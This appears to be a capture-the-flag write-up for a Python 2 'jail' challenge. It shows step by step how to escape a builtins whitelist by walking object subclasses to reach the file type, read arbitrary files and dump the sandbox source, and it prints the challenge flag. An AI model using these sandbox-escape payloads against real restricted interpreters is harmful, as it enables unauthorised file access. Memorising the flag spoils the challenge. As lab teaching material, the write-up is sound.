# Prison Break

Author: [roerohan](https://github.com/roerohan)

## Description

This is a python jail challenge.

## Requirements

- Docker: [Dockerfile](./Dockerfile)
- Basic Python.

## Sources

```
I saw them put someone in jail. Can you find out who it is?
They said this is the best prison ever built. You sure can't break it, can you?
```

## Exploit

This is a classic jail challenge where some `builtins` have been blocked, such as `import`, `exec`, `file`, `quit`, `execfile`, etc. Your job is to find the flag hidden on the server. When you connect to the program you see:

```python
$ python2 jail.py
Find the flag.
>>> print 1+1
2
```

When you try `print 1+1`, you see that it works even without the `()`, indicating that this is `python2`. You can try to print some things to check what functions are allowed.

```python
>>> __import__('system')
You have encountered an error.
>>> __import__
You have encountered an error.
>>> exec
You have encountered an error.
>>> execfile
You have encountered an error.
>>> print dir()      
['code_string', 'self']
```

So, we see that `dir` is allowed, we can use that to check out the allowed builtins.

```python
>>> print dir(__builtins__)
['ArithmeticError', 'AssertionError', 'AttributeError', 'Exception', 'False', 'None', 'True', 'abs', 'basestring', 'bin', 'bytearray', 'bytes', 'complex', 'dict', 'dir', 'help']
```

We see that `dict` is allowed. So, we can use the `__class__` to find the class, then we can use `__base__` to find the baseclass. Now there's a `__subclasses__` function that shows all the classes of that base class, which basically shows all the classes you'd need. 

```python
>>> print dict.__class__.__base__.__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class '__main__.Sandbox'>]
```

Notice the `<type 'file'>` in the array. We can use this to access the `read` function on `type` file. We can loop through this list (or count) to find that the index of `<type 'file>` is 40.

```python
>>> print dict.__class__.__base__.__subclasses__()[40]
<type 'file'>
```

Now, we can call `.read()` on this! Let's try to read `flag.txt`.

```python
>>> print ().__class__.__bases__[0].__subclasses__()[40]('flag.txt', 'r').read()
The flag is in the source code.
```

Great, so we know where the flag is, but we don't know the file name. However, we can use `__file__`.

```
__file__ is a variable that contains the path to the module that is currently being imported. Python creates a __file__ variable for itself when it is about to import a module. The updating and maintaining of this variable is the responsibility of the import system.
```

So, the final payload will be:

```python
>>> print ().__class__.__bases__[0].__subclasses__()[40](__file__, 'r').read()
#!/usr/bin/python2

import sys

class Sandbox(object):
    def execute(self, code_string):
        exec(code_string)

sandbox = Sandbox()

_raw_input = raw_input

main = sys.modules["__main__"].__dict__
orig_builtins = main["__builtins__"].__dict__

builtins_whitelist = set((
    #exceptions
    'ArithmeticError', 'AssertionError', 'AttributeError', 'Exception',

    #constants
    'False', 'None', 'True',

    #types
    'basestring', 'bytearray', 'bytes', 'complex', 'dict',

    #functions
    'abs', 'bin', 'dir', 'help'

    # blocked: eval, execfile, exit, file, quit, reload, import, etc.
))

for builtin in orig_builtins.keys():
    if builtin not in builtins_whitelist:
        del orig_builtins[builtin]

print("Find the flag.")

def flag_function():
    flag = "csictf{m1ch34l_sc0fi3ld_fr0m_pr1s0n_br34k}"

while 1:
    try:
        code = _raw_input(">>> ")
        sandbox.execute(code)

    except Exception:
        print("You have encountered an error.")
```

You get the source code, and you see the flag in it.
<br />

The flag is:

```
csictf{m1ch34l_sc0fi3ld_fr0m_pr1s0n_br34k}
```